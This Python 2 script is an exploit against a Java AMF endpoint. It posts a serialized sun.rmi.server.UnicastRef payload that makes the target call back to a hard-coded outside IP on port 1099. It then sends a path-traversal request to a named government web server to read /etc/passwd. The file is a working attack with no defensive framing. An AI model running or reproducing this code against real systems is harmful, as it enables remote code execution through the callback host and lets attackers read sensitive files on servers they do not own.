import struct
import sys
import socket
import requests


target_IP = sys.argv[1]

# http://www.scgy.lss.gov.cn:8000/gywssb/
# f = open("/myhktools/tmp/payXX.ser", "r")
# amf_payload = f.read();
# f.close()
# "/messagebroker/amf"#
url = target_IP + "/CMHS?CMHS=RedAMF3Object"
headers = {'Content-Type': 'application/x-amf','CMHS':'CMHS'}
callback_IP="144.34.246.113"
callback_port="1099"
amf_payload = '\x00\x03\x00\x00\x00\x01\x00\x00\x00\x00\xff\xff\xff\xff\x11\x0a' + \
              '\x07\x33' + 'sun.rmi.server.UnicastRef' + struct.pack('>H', len(callback_IP)) + callback_IP + \
              struct.pack('>I', int(callback_port)) + \
              '\xf9\x6a\x76\x7b\x7c\xde\x68\x4f\x76\xd8\xaa\x3d\x00\x00\x01\x5b\xb0\x4c\x1d\x81\x80\x01\x00';

# print(url)
# print(amf_payload)
try:
    response = requests.post(url, headers=headers, data=amf_payload, verify=False)
    
    print response
except Exception, e:
    print e
    pass

# r = requests.get(url = target_IP + '/.x.jsp')
r = requests.post(url="http://www.scgy.lss.gov.cn:8000/gywssb/CMHS?CMHS=GetOutSpFile&rmf=../../../../../../../../../../../../../../etc/passwd&rmpath=/",headers=headers)
print(r.text)
if not r.text.find("404--Not Found"):
    print("ok:" + url)
    
else:
    print("not ok:" + url + "\n\n")
